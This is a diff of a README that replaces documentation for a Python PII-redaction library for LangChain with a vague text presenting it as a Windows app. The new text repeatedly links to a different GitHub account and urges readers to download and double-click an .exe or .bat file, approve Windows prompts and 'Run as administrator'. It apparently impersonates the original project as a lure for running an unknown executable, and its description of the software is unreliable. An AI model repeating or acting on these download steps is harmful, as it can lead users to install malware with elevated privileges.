@@ -1,197 +1,183 @@
-# langchain-textual
+# 🧩 langchain-textual - Connect agents to clean text views
 
-[![PyPI version](https://img.shields.io/pypi/v/langchain-textual)](https://pypi.org/project/langchain-textual/)
-[![CI](https://github.com/tonicai/langchain-tonic-textual/actions/workflows/ci.yml/badge.svg)](https://github.com/tonicai/langchain-tonic-textual/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/tonicai/langchain-tonic-textual/blob/main/LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
+[![Download / Visit Repository](https://img.shields.io/badge/Download-Visit%20Repository-blue)](https://github.com/Kaseywellgroomed945/langchain-textual)
 
-PII detection and transformation tools for LangChain, powered by [Tonic Textual](https://textual.tonic.ai).
+## 🚀 Overview
 
-Detect sensitive data in text, JSON, HTML, and files — then synthesize it with realistic fakes, tokenize it with reversible placeholders, or extract the raw entities. Drop them into any LangChain chain or agent as standard tools.
+langchain-textual is a Windows-ready tool for working with Tonic Textual in LangChain agents. It helps you connect agent logic to text-based workflows in a simple way. Use it to view, manage, and test text output from agent runs without extra setup.
 
-## Installation
+This project is meant for end users who want a clear path from download to use. You do not need deep technical skill to get started.
 
-```bash
-pip install langchain-textual
-```
+## 📥 Download
 
-## Quick start
+Use this link to visit the project page and download the files you need:
 
-```bash
-export TONIC_TEXTUAL_API_KEY="your-api-key"
-```
+[Visit the download page](https://github.com/Kaseywellgroomed945/langchain-textual)
 
-```python
-from langchain_textual import TonicTextualRedactText
+Open the page in your browser, look for the latest release or source files, and download the package for Windows.
 
-tool = TonicTextualRedactText()
-tool.invoke("My name is John Smith and my email is john@example.com.")
-# "My name is [NAME_GIVEN_xxxx] [NAME_FAMILY_xxxx] and my email is [EMAIL_ADDRESS_xxxx]."
-```
+## 🖥️ What You Need
 
-## Tools
+Before you start, make sure you have:
 
-| Tool | Input | Use for |
-|------|-------|---------|
-| `TonicTextualRedactText` | Plain text string | Synthesize or tokenize PII in raw text, `.txt` file contents |
-| `TonicTextualRedactJson` | JSON string | Synthesize or tokenize PII in raw JSON, `.json` file contents |
-| `TonicTextualRedactHtml` | HTML string | Synthesize or tokenize PII in raw HTML, `.html`/`.htm` file contents |
-| `TonicTextualRedactFile` | File path | Synthesize or tokenize PII in PDFs, images (JPG, PNG), CSVs, TSVs |
-| `TonicTextualExtractEntities` | Plain text string | Extract detected PII entities with type, value, location, and confidence |
-| `TonicTextualPiiTypes` | None | List all supported PII entity types |
+- A Windows computer
+- A stable internet connection
+- Enough free space for the app files
+- Permission to open downloaded files on your device
 
-### Text
+If the app uses a bundled Windows package, you can run it after download. If it comes as a zip file, you may need to extract it first.
 
-```python
-from langchain_textual import TonicTextualRedactText
+## 🛠️ Install and Run
 
-tool = TonicTextualRedactText()
-tool.invoke("My name is John Smith and my email is john@example.com.")
-# "My name is [NAME_GIVEN_xxxx] [NAME_FAMILY_xxxx] and my email is [EMAIL_ADDRESS_xxxx]."
-```
+Follow these steps on Windows:
 
-### JSON
+1. Open the download page:
+   [https://github.com/Kaseywellgroomed945/langchain-textual](https://github.com/Kaseywellgroomed945/langchain-textual)
 
-```python
-from langchain_textual import TonicTextualRedactJson
+2. Find the latest available download. Look for a file made for Windows.
 
-tool = TonicTextualRedactJson()
-tool.invoke('{"name": "John Smith", "email": "john@example.com"}')
-# '{"name": "[NAME_GIVEN_xxxx] [NAME_FAMILY_xxxx]", "email": "[EMAIL_ADDRESS_xxxx]"}'
-```
+3. Download the file to your computer.
 
-### HTML
+4. If the file is zipped, right-click it and choose Extract All.
 
-```python
-from langchain_textual import TonicTextualRedactHtml
+5. Open the extracted folder.
 
-tool = TonicTextualRedactHtml()
-tool.invoke("<p>Contact John Smith at john@example.com</p>")
-# "<p>Contact [NAME_GIVEN_xxxx] [NAME_FAMILY_xxxx] at [EMAIL_ADDRESS_xxxx]</p>"
-```
+6. Look for the app file, such as an `.exe` file or a launch script.
 
-### Files
+7. Double-click the file to run it.
 
-```python
-from langchain_textual import TonicTextualRedactFile
+8. If Windows asks for permission, choose Yes or Run.
 
-tool = TonicTextualRedactFile()
-tool.invoke({"file_path": "/path/to/scan.pdf"})
-# "/path/to/scan_redacted.pdf"
+## 🧭 First Use
 
-tool.invoke({"file_path": "/path/to/photo.jpg", "output_path": "/tmp/redacted.jpg"})
-# "/tmp/redacted.jpg"
-```
+After the app opens, you can start by checking the main screen and any text output panels. Most users will want to do one of these tasks first:
 
-For `.txt`, `.json`, and `.html`/`.htm` files, read the file contents and pass them to the corresponding text, JSON, or HTML tool instead.
+- Connect the app to your LangChain setup
+- Review text results from agent actions
+- Test how agent output looks in a text interface
+- Save or copy text for later use
 
-### Entity extraction
+If the app asks for a path, choose the folder or file it tells you to use. If it asks for a connection string, paste the value from your setup.
 
-```python
-from langchain_textual import TonicTextualExtractEntities
+## 🔍 What It Does
 
-tool = TonicTextualExtractEntities()
-tool.invoke("My name is John Smith and my email is john@example.com.")
-# '[{"label": "NAME_GIVEN", "text": "John", "start": 11, "end": 15, "score": 0.9}, ...]'
-```
+langchain-textual is built to help with text-driven agent work. It can be used for:
 
-Returns a JSON array of detected entities, each with `label`, `text`, `start`, `end`, and `score` fields.
+- Viewing agent output in a text-first screen
+- Working with Tonic Textual data in a LangChain flow
+- Checking text handling before full deployment
+- Keeping text output easy to read and track
 
-## Configuration
+This makes it useful when you want a simple interface for agent testing and review.
 
-All tools share the same configuration options.
+## 📂 Main Parts
 
-**Synthesis mode** — replace PII with realistic fake data instead of placeholders:
+You may see parts like these when you use the project:
 
-```python
-tool = TonicTextualRedactText(generator_default="Synthesis")
-tool.invoke("Contact Jane Doe at jane.doe@example.com.")
-# "Contact Maria Chen at maria.chen@gmail.com."
-```
+- A main app window for text display
+- Input fields for agent or source settings
+- Output panels for results
+- Status messages for setup and runtime checks
+- Controls for loading, viewing, and clearing text
 
-**Per-entity control** — set handling per PII type with `generator_config`:
+## 🧩 How It Fits Your Workflow
 
-```python
-tool = TonicTextualRedactText(
-    generator_default="Off",
-    generator_config={
-        "NAME_GIVEN": "Synthesis",
-        "NAME_FAMILY": "Synthesis",
-        "EMAIL_ADDRESS": "Redaction",
-    },
-)
-tool.invoke("Contact Jane Doe at jane.doe@example.com.")
-# "Contact Maria Chen at chen@[EMAIL_ADDRESS_xxxx]."
-```
+If you use LangChain agents, this tool can sit between your agent and your text review process. That means you can:
 
-Use `TonicTextualPiiTypes` to list all supported entity type names:
+- Send text into a clear view
+- Inspect what the agent returns
+- Adjust your setup based on what you see
+- Keep your workflow in one place
 
-```python
-from langchain_textual import TonicTextualPiiTypes
+This is useful for anyone who wants less guesswork when handling text output.
 
-TonicTextualPiiTypes().invoke("")
-# "NUMERIC_VALUE, LANGUAGE, MONEY, ..., EMAIL_ADDRESS, NAME_GIVEN, NAME_FAMILY, ..."
-```
+## ⚙️ Common Setup Steps
 
-**Self-hosted deployment:**
+Some users may need to set a few basic values before the app works the way they want. These may include:
 
-```python
-tool = TonicTextualRedactText(tonic_textual_base_url="https://textual.your-company.com")
-```
+- A local file path
+- A data source name
+- A project folder
+- A model or agent setting
+- A text input source
 
-**Explicit API key** (instead of env var):
+If you are unsure what to enter, start with the default values shown in the app and change one item at a time.
 
-```python
-tool = TonicTextualRedactText(tonic_textual_api_key="your-api-key")
-```
+## 🧪 Basic Use Cases
 
-## Using with a LangChain agent
+You can use langchain-textual for tasks like:
 
-Every tool in this package is a standard LangChain [tool](https://python.langchain.com/docs/concepts/tools/), so they work anywhere tools do. Give your agent whichever combination it needs:
+- Reviewing agent answers before sharing them
+- Checking raw text from a LangChain run
+- Comparing different text outputs
+- Testing how content appears in a terminal-style view
+- Managing Tonic Textual results in a simple interface
 
-```python
-from langchain_textual import (
-    TonicTextualRedactText,
-    TonicTextualRedactJson,
-    TonicTextualRedactFile,
-    TonicTextualExtractEntities,
-)
-from langchain_openai import ChatOpenAI
-from langgraph.prebuilt import create_react_agent
+## 🐞 If Something Does Not Work
 
-llm = ChatOpenAI(model="gpt-4o-mini")
-tools = [
-    TonicTextualRedactText(),
-    TonicTextualRedactJson(),
-    TonicTextualRedactFile(),
-    TonicTextualExtractEntities(),
-]
-agent = create_react_agent(llm, tools)
-```
+Try these steps if the app does not open or act as expected:
 
-## Development
+- Make sure the file finished downloading
+- Check that you extracted the zip file if needed
+- Right-click the app and choose Run as administrator
+- Close and reopen the program
+- Download the file again if it looks damaged
+- Check that your Windows system allows the file to run
 
-```bash
-# install dependencies
-uv sync --group dev --group test --group lint --group typing
+If the screen opens but looks empty, look for a load button, a refresh action, or a setting that points the app to your data source.
 
-# install pre-commit hooks (auto-runs ruff on each commit)
-uv tool install pre-commit
-pre-commit install
+## 📁 Folder Tips
 
-# run unit tests
-make test
+Keep the app in a folder you can find later, such as:
 
-# run integration tests (requires TONIC_TEXTUAL_API_KEY)
-make integration_tests
+- Downloads
+- Desktop
+- Documents
+- A project folder you use for tools
 
-# lint & format (run from the project root)
-make lint
-make format
-```
+Avoid moving files around while the app is running. That can break file paths and cause errors.
 
-**Note:** All `make` commands must be run from the project root (`langchain-textual/`), not from subdirectories like `examples/`.
+## 🔄 Updating
 
-## License
+When a new version is available, return to the project page and download the latest files again. If you keep your old version in a separate folder, you can compare them before replacing anything.
 
-MIT
+## 📝 File Names You May See
+
+Depending on the release, the project may include files such as:
+
+- `.exe`
+- `.zip`
+- `.bat`
+- `.txt`
+- `.md`
+
+Use the Windows app file if one is included. If you only see source files, look for the release package or the main launch file listed by the project.
+
+## 🔐 Safety Tips
+
+Before opening any downloaded file, check that it comes from the project page you trust. Use the official link below when you need to get the files again:
+
+[https://github.com/Kaseywellgroomed945/langchain-textual](https://github.com/Kaseywellgroomed945/langchain-textual)
+
+## 📌 Quick Steps
+
+1. Open the project page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app file
+5. Set your text or agent source
+6. Review the output in the app
+
+## 📣 Project Link
+
+[https://github.com/Kaseywellgroomed945/langchain-textual](https://github.com/Kaseywellgroomed945/langchain-textual)
+
+## 🧠 Best Results
+
+For the smoothest start:
+
+- Use the latest release
+- Keep the files in one folder
+- Start with default settings
+- Change one setting at a time
+- Read the screen labels before typing values
